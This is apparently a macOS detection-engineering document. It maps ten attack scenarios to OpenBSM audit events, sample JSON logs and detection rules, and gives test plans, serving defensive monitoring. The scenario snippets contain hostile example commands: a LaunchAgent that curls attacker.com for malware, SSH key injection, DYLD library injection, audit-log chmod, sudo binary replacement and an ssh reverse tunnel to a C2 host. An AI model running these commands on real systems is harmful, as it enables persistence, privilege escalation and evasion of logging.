# macOS OpenBSM Attack Scenario Coverage

## Scenario Matrix

This document maps real-world attack scenarios to the expanded OpenBSM handlers.

---

## 1. Privilege Escalation via Setuid Binary

### Scenario
Unprivileged attacker executes setuid binary to gain root access.

```bash
$ id
uid=501(attacker) gid=20(staff)

$ /usr/bin/sudo -u root /bin/bash
# id
uid=0(root) gid=0(wheel)
```

### Events Generated

#### Event 1: Process Execution (AUE_EXECVE)
```json
{
  "aue_code": 59,
  "exe": "/usr/bin/sudo",
  "pid": 1234,
  "uid": 501,
  "likely_setuid": true,
  "attack_class": "privilege_escalation",
  "tags": ["macos", "process", "exec", "priv_sudo_exec", "privilege_escalation"],
  "fields": {
    "sudo_target_user": "root",
    "flag_interactive": true,
    "args_preview": "sudo -u root /bin/bash"
  }
}
```

#### Event 2: UID Change (AUE_SETUID)
```json
{
  "aue_code": 24,
  "event_type": "priv_setuid",
  "pid": 1234,
  "old_uid": 501,
  "new_uid": 0,
  "euid": 0,
  "escalation": true,
  "escalation_type": "uid_to_root",
  "tags": ["macos", "priv_escalation", "priv_setuid"],
  "attack_class": "privilege_escalation"
}
```

### Detection Rules
- Flag any AUE_SETUID where `escalation: true`
- Flag any AUE_EXECVE where exe contains "sudo" and `attack_class` is set
- Correlate execution → UID change events via proc_key

---

## 2. Persistence via LaunchAgent

### Scenario
Attacker creates malicious LaunchAgent for persistence.

```bash
$ cat > ~/.ssh/../Library/LaunchAgents/com.apple.malware.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.apple.malware</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/bin/curl</string>
    <string>http://attacker.com/malware</string>
  </array>
</dict>
</plist>
EOF
```

### Events Generated

#### Event 1: File Create (AUE_CREATE)
```json
{
  "aue_code": 300,
  "path": "/Users/attacker/Library/LaunchAgents/com.apple.malware.plist",
  "pid": 2345,
  "uid": 501,
  "path_tags": ["persistence", "user_writable"],
  "attack_class": "persistence",
  "tags": ["macos", "file", "create", "persistence"]
}
```

#### Event 2: File Write (AUE_WRITE, multiple)
```json
{
  "aue_code": 5,
  "path": "/Users/attacker/Library/LaunchAgents/com.apple.malware.plist",
  "pid": 2345,
  "uid": 501,
  "path_tags": ["persistence", "user_writable"],
  "attack_class": "persistence",
  "tags": ["macos", "file", "write", "persistence"]
}
```

### Detection Rules
- Flag any file operation (create/write) where `path_tags` contains "persistence"
- Alert on LaunchAgents/LaunchDaemons writes regardless of uid
- Correlate create + multiple writes on same path (likely plist generation)

---

## 3. SSH Key Injection (Lateral Movement)

### Scenario
Attacker adds SSH public key to authorized_keys for persistence.

```bash
# On compromised host
$ echo "ssh-rsa AAAA... attacker@external" >> ~/.ssh/authorized_keys
```

### Events Generated

#### Event 1: File Write to authorized_keys
```json
{
  "aue_code": 5,
  "path": "/Users/victim/.ssh/authorized_keys",
  "pid": 3456,
  "uid": 501,
  "path_tags": ["ssh", "persistence", "user_writable"],
  "attack_class": "persistence",
  "tags": ["macos", "file", "write", "ssh", "persistence"]
}
```

#### Event 2: Remote SSH Connection (Network)
```json
{
  "aue_code": 43,
  "remote_ip": "203.0.113.45",
  "remote_port": 22,
  "remote_network": "internet",
  "pid": 4567,
  "uid": 501,
  "protocol": "tcp",
  "tags": ["macos", "network", "connect", "lateral_movement"]
}
```

### Detection Rules
- Alert on any write to ~/.ssh/authorized_keys (high confidence)
- Correlate SSH connection + authorized_keys write on same host
- Flag writes to .ssh/ directory by any non-system user

---

## 4. Process Injection via DYLD

### Scenario
Attacker injects malicious dylib into legitimate process.

```bash
$ DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /usr/bin/mail
```

### Events Generated

#### Event: Execution with Dylib Injection
```json
{
  "aue_code": 59,
  "exe": "/usr/bin/mail",
  "pid": 5678,
  "uid": 501,
  "dylib_injection_env": "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib",
  "attack_class": "process_injection",
  "tags": ["macos", "process", "exec", "dylib_injection_env", "process_injection"],
  "fields": {
    "argv_count": 1
  }
}
```

### Detection Rules
- Flag any AUE_EXECVE where `dylib_injection_env` is set
- Alert even if DYLD variable is in environment (before execution)
- Check if /tmp/evil.dylib path is user-writable (high risk)

---

## 5. Log Tampering (Defense Evasion)

### Scenario
Attacker disables audit logging by modifying permissions.

```bash
$ chmod 000 /var/audit/audit.log
```

### Events Generated

#### Event: Chmod on Audit Log
```json
{
  "aue_code": 17,
  "path": "/var/audit/audit.log",
  "pid": 6789,
  "uid": 0,
  "path_tags": ["audit_tamper"],
  "attack_class": "defense_evasion",
  "tags": ["macos", "file", "chmod", "audit_tamper", "defense_evasion"]
}
```

### Detection Rules
- Alert on ANY chmod of /var/audit/* or /var/log/ paths (high confidence)
- Flag based on path_tags alone (even if file doesn't exist)
- Escalate if non-root uid attempting chmod on audit files

---

## 6. C&C Connection on Non-Standard Port

### Scenario
Malware makes outbound connection to C&C on backdoor port.

```c
// Inside malware process
connect(sock, (struct sockaddr*)&addr, sizeof(addr));
// addr = {192.0.2.1:4444}
```

### Events Generated

#### Event: Network Connect to Suspicious Port
```json
{
  "aue_code": 43,
  "remote_ip": "192.0.2.1",
  "remote_port": 4444,
  "remote_network": "internet",
  "pid": 7890,
  "uid": 501,
  "protocol": "tcp",
  "suspicious_port": true,
  "attack_class": "command_control",
  "tags": ["macos", "network", "connect", "suspicious_port", "command_control"],
  "fields": {
    "remote_port": 4444
  }
}
```

### Detection Rules
- Alert on suspicious_port match (4444, 5555, 6666, etc.)
- Escalate if internet-destined (non-RFC1918)
- Correlate with process execution context (what spawned connection?)

---

## 7. Privilege Escalation via Cron Job

### Scenario
Attacker creates cron job for privilege escalation.

```bash
$ crontab -e
# Add line:
* * * * * /usr/bin/sudo -u root /tmp/malware.sh
```

### Events Generated

#### Event 1: Write to Crontab
```json
{
  "aue_code": 5,
  "path": "/usr/lib/cron/tabs/attacker",
  "pid": 8901,
  "uid": 501,
  "path_tags": ["cron", "persistence"],
  "attack_class": "persistence",
  "tags": ["macos", "file", "write", "cron", "persistence"]
}
```

#### Event 2: Cron Execution (Future)
```json
{
  "aue_code": 59,
  "exe": "/usr/bin/sudo",
  "pid": 9012,
  "uid": 501,
  "likely_setuid": true,
  "attack_class": "privilege_escalation",
  "tags": ["macos", "process", "exec", "priv_sudo_exec"]
}
```

### Detection Rules
- Alert on writes to /etc/cron.d/, /usr/lib/cron/tabs/
- Monitor sudo execution from cron parent (ppid)
- Flag cron + uid=0 combination (malicious cron execution)

---

## 8. Setuid Binary Tampering

### Scenario
Attacker modifies setuid binary.

```bash
$ /bin/cp /tmp/evil /usr/bin/sudo
$ chmod u+s /usr/bin/sudo
```

### Events Generated

#### Event 1: Create/Overwrite Sudo Binary
```json
{
  "aue_code": 5,
  "path": "/usr/bin/sudo",
  "pid": 10123,
  "uid": 501,  // Non-root!
  "path_tags": ["user_writable"],  // User shouldn't write here
  "attack_class": "persistence",   // Actually privilege escalation
  "tags": ["macos", "file", "write"]
}
```

#### Event 2: Chmod Setuid Binary
```json
{
  "aue_code": 17,
  "path": "/usr/bin/sudo",
  "pid": 10123,
  "uid": 501,
  "tags": ["macos", "file", "chmod"]
}
```

### Detection Rules
- Alert on ANY write to /usr/bin/sudo, /usr/bin/passwd, /sbin/* by non-root
- Flag chmod of setuid binaries with path_tags or historical baseline
- Implement file integrity monitoring (hash verification)

---

## 9. Group Escalation

### Scenario
Attacker adds themselves to wheel (admin) group.

```bash
$ dscl . append /Groups/wheel GroupMembership attacker
# Or via setgroups syscall
```

### Events Generated

#### Event: Setgroups to Wheel
```json
{
  "aue_code": 128,
  "pid": 11234,
  "uid": 0,  // Must be root to call setgroups
  "group_count": 5,  // Now member of 5 groups
  "tags": ["macos", "priv_escalation", "priv_setgroups"],
  "attack_class": "privilege_escalation"
}
```

### Detection Rules
- Flag setgroups from non-root user (would fail anyway)
- Monitor setgroups calls that increase group count significantly
- Correlate with subsequent setgid/setegid calls

---

## 10. Reverse Shell via SSH

### Scenario
Attacker connects back to remote shell.

```bash
$ /usr/bin/ssh -R 2222:localhost:22 attacker@c2.example.com
```

### Events Generated

#### Event 1: SSH Execution
```json
{
  "aue_code": 59,
  "exe": "/usr/bin/ssh",
  "pid": 12345,
  "uid": 501,
  "remote_tool": "ssh",
  "attack_class": "lateral_movement",
  "tags": ["macos", "process", "exec", "remote_tool", "lateral_movement"],
  "fields": {
    "argv_count": 4,
    "args_preview": "/usr/bin/ssh -R 2222:localhost:22 attacker@c2.example.com"
  }
}
```

#### Event 2: Network Connect to C2
```json
{
  "aue_code": 43,
  "remote_ip": "203.0.113.100",
  "remote_port": 22,
  "remote_network": "internet",
  "pid": 12345,
  "uid": 501,
  "tags": ["macos", "network", "connect"],
  "fields": {
    "protocol": "tcp"
  }
}
```

### Detection Rules
- Alert on any remote tool execution (ssh, scp, rsync, tmux, screen)
- Correlate remote tool execution + outbound network connection
- Flag SSH with reverse proxy flags (-R, -L)

---

## Correlation Examples

### Attack Chain: Privilege Escalation → Persistence

**Scenario**: Attacker escalates to root, then installs LaunchDaemon

**Events**:
1. AUE_EXECVE: /usr/bin/sudo → `attack_class: "privilege_escalation"`
2. AUE_SETUID: uid 501 → 0 → `escalation: true`
3. AUE_CREATE: ~/Library/LaunchDaemons/malware.plist → `attack_class: "persistence"`
4. AUE_WRITE (multiple): Writing plist content

**Detection**:
```
Alert IF:
  - Same pid: AUE_SETUID(escalation=true) THEN AUE_CREATE(persistence)
  - Time delta < 5 seconds
  - UID transitions 501 → 0 → plist creation by root
```

### Attack Chain: Lateral Movement → C&C

**Scenario**: SSH to peer, then reverse shell to attacker

**Events**:
1. AUE_EXECVE: /usr/bin/ssh remote_host → `remote_tool: "ssh"`
2. AUE_CONNECT: 192.0.2.10:22 → remote_network: "internet"
3. AUE_EXECVE (on remote): ssh -R → `remote_tool: "ssh"`
4. AUE_CONNECT: 203.0.113.1:443 → `suspicious_port: true`

**Detection**:
```
Alert IF:
  - SSH execution + outbound port 22 (lateral movement confirmed)
  - Followed by reverse shell pattern (known C2 port)
  - Cross-correlate with other hosts in VPC
```

---

## Coverage Summary by MITRE Tactic

| Tactic | Technique | Handler | Detection |
|--------|-----------|---------|-----------|
| **Privilege Escalation** | Setuid/Setgid | AUE_SETUID/SETGID | `escalation: true` field |
| **Privilege Escalation** | Sudo/Su | AUE_EXECVE | `priv_sudo_exec` tag |
| **Privilege Escalation** | Privilege Boundary Crossing | AUE_EXECVE | euid ≠ uid check |
| **Privilege Escalation** | Group Escalation | AUE_SETGROUPS | Group count change |
| **Persistence** | Launch Agent | AUE_WRITE/CREATE | `path_tags: [persistence]` |
| **Persistence** | SSH Key Injection | AUE_WRITE | `path_tags: [ssh]` |
| **Persistence** | Cron Job | AUE_WRITE | `path_tags: [cron]` |
| **Persistence** | Shell Init Modification | AUE_WRITE | `path_tags: [shell_init]` |
| **Lateral Movement** | SSH/SCP/Rsync | AUE_EXECVE | `remote_tool` field |
| **Lateral Movement** | SSH Connection | AUE_CONNECT | Remote IP/port tracking |
| **Execution** | Setuid Binary | AUE_EXECVE | `likely_setuid: true` |
| **Process Injection** | DYLD Injection | AUE_EXECVE | `dylib_injection_env` field |
| **Defense Evasion** | Log Tampering | AUE_CHMOD | `path_tags: [audit_tamper]` |
| **Defense Evasion** | Log Deletion | AUE_UNLINK | Log paths in bsm_file_ops |
| **Command & Control** | C&C Connection | AUE_CONNECT | `suspicious_port: true` |
| **Command & Control** | Reverse Shell | AUE_EXECVE + AUE_CONNECT | Correlation pattern |

---

## Testing Recommendations

### Unit Test Coverage
- [ ] UID escalation detection (uid→0)
- [ ] GID escalation detection
- [ ] Path classification (all 8 tags)
- [ ] Remote tool detection (6 tools)
- [ ] Suspicious port detection (12 ports)
- [ ] DYLD injection env detection (3 vars)
- [ ] Bounded parsing limits

### Integration Test Scenarios
- [ ] Live sudo execution
- [ ] LaunchAgent creation by user
- [ ] SSH authorized_keys modification
- [ ] DYLD_INSERT_LIBRARIES execution
- [ ] crontab write and execution
- [ ] Outbound SSH connection
- [ ] Port 4444 connection (Metasploit)
- [ ] setuid binary execution
- [ ] Chmod on /var/audit/

### Performance Tests
- [ ] Bounded parsing with huge argv
- [ ] Network classification (1M IP addresses)
- [ ] Path classification (10K unique paths)
- [ ] Event generation throughput (events/sec)

---

## Known Limitations

1. **Token Parsing Not Implemented**: All handlers currently accept parsed placeholders (pid=0, uid=0). Real token decoding needed.
2. **No File Hashing**: Can't detect binary replacement vs. legitimate updates.
3. **No Baseline Learning**: All files tagged equally (can't distinguish /usr/bin/sudo from /tmp/sudo).
4. **No Behavioral Correlation**: Flags individual events; doesn't connect chains (yet).
5. **No Rate Limiting**: Could be flooded with legitimate writes to persistence paths during normal admin work.

---

## Future Enhancements

1. **ML Scoring**: Assign confidence scores based on event combination patterns
2. **Playbook Integration**: Auto-respond (quarantine, alert, block) based on event class
3. **File Integrity Monitoring**: Hash tracking for system binaries
4. **Behavioral Baselining**: Learn what's normal for each user/host combo
5. **Network Context**: Resolve IPs to threat intelligence feeds
